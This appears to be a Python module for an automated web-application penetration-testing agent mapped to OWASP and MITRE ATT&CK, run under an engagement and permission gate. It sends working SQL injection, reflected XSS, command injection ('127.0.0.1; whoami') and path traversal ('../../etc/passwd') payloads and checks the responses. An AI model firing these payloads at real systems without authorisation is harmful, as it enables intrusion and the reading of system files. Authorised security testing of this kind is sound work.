"""Web application testing agent — OWASP Top 10.

Maps to MITRE ATT&CK: Initial Access (TA0001), Execution (TA0002).
"""

import uuid
import httpx
from typing import Any, Dict, List
from .base_agent import BaseAgent
from ..host_utils import extract_host


class WebAppAgent(BaseAgent):
    """Web application security testing agent."""

    def __init__(self, engagement_id: str, trustgate):
        super().__init__(
            agent_id=f"webapp-{uuid.uuid4().hex[:8]}",
            role="webapp_agent",
            engagement_id=engagement_id,
            trustgate=trustgate,
        )
        self.mitre_techniques = [
            "T1190",  # Exploit Public-Facing Application
            "T1059",  # Command and Scripting Interpreter
        ]

    def run(self, target: str) -> List[Dict]:
        findings = []
        host = extract_host(target)

        # 1. SQL injection test on login
        result = self.execute_tool(
            tool_name="sql_injection_test",
            tool_args={"target": target, "endpoint": "/login", "payload": "' OR 1=1 --"},
            target=host,
            technique="web-app",
            provenance={"target": "trusted", "endpoint": "trusted", "payload": "trusted"},
            executor_fn=lambda args: self._test_sqli(args["target"], args["endpoint"], args["payload"]),
        )
        if result["allowed"] and result["result"]:
            findings.append({
                "type": "sql_injection",
                "agent": self.role,
                "target": target,
                "data": result["result"],
                "mitre": "T1190",
            })

        # 2. XSS test on search
        result = self.execute_tool(
            tool_name="xss_test",
            tool_args={"target": target, "endpoint": "/search", "payload": "<script>alert(1)</script>"},
            target=host,
            technique="web-app",
            provenance={"target": "trusted", "endpoint": "trusted", "payload": "trusted"},
            executor_fn=lambda args: self._test_xss(args["target"], args["endpoint"], args["payload"]),
        )
        if result["allowed"] and result["result"]:
            findings.append({
                "type": "xss",
                "agent": self.role,
                "target": target,
                "data": result["result"],
                "mitre": "T1190",
            })

        # 3. Command injection test on ping
        result = self.execute_tool(
            tool_name="command_injection_test",
            tool_args={"target": target, "endpoint": "/ping", "payload": "127.0.0.1; whoami"},
            target=host,
            technique="web-app",
            provenance={"target": "trusted", "endpoint": "trusted", "payload": "trusted"},
            executor_fn=lambda args: self._test_cmdi(args["target"], args["endpoint"], args["payload"]),
        )
        if result["allowed"] and result["result"]:
            findings.append({
                "type": "command_injection",
                "agent": self.role,
                "target": target,
                "data": result["result"],
                "mitre": "T1059",
            })

        # 4. Path traversal test on file viewer
        result = self.execute_tool(
            tool_name="directory_traversal",
            tool_args={"target": target, "endpoint": "/file", "payload": "../../etc/passwd"},
            target=host,
            technique="web-app",
            provenance={"target": "trusted", "endpoint": "trusted", "payload": "trusted"},
            executor_fn=lambda args: self._test_path_traversal(args["target"], args["endpoint"], args["payload"]),
        )
        if result["allowed"] and result["result"]:
            findings.append({
                "type": "path_traversal",
                "agent": self.role,
                "target": target,
                "data": result["result"],
                "mitre": "T1190",
            })

        self.findings = findings
        return findings

    def _test_sqli(self, target: str, endpoint: str, payload: str) -> dict:
        try:
            resp = httpx.post(f"{target}{endpoint}", data={"username": payload, "password": "x"}, timeout=5.0)
            vulnerable = "Welcome" in resp.text or "admin" in resp.text.lower()
            return {"vulnerable": vulnerable, "status_code": resp.status_code, "payload": payload, "response_excerpt": resp.text[:20000]}
        except Exception as e:
            return {"error": str(e)}

    def _test_xss(self, target: str, endpoint: str, payload: str) -> dict:
        try:
            resp = httpx.get(f"{target}{endpoint}", params={"q": payload}, timeout=5.0)
            vulnerable = payload in resp.text
            return {"vulnerable": vulnerable, "status_code": resp.status_code, "payload": payload, "response_excerpt": resp.text[:20000]}
        except Exception as e:
            return {"error": str(e)}

    def _test_cmdi(self, target: str, endpoint: str, payload: str) -> dict:
        try:
            resp = httpx.get(f"{target}{endpoint}", params={"host": payload}, timeout=5.0)
            vulnerable = "root" in resp.text.lower() or "whoami" in resp.text.lower() or "windows" in resp.text.lower()
            return {"vulnerable": vulnerable, "status_code": resp.status_code, "payload": payload, "response_excerpt": resp.text[:20000]}
        except Exception as e:
            return {"error": str(e)}

    def _test_path_traversal(self, target: str, endpoint: str, payload: str) -> dict:
        try:
            resp = httpx.get(f"{target}{endpoint}", params={"path": payload}, timeout=5.0)
            vulnerable = "root:" in resp.text or "passwd" in resp.text.lower()
            return {"vulnerable": vulnerable, "status_code": resp.status_code, "payload": payload, "response_excerpt": resp.text[:20000]}
        except Exception as e:
            return {"error": str(e)}
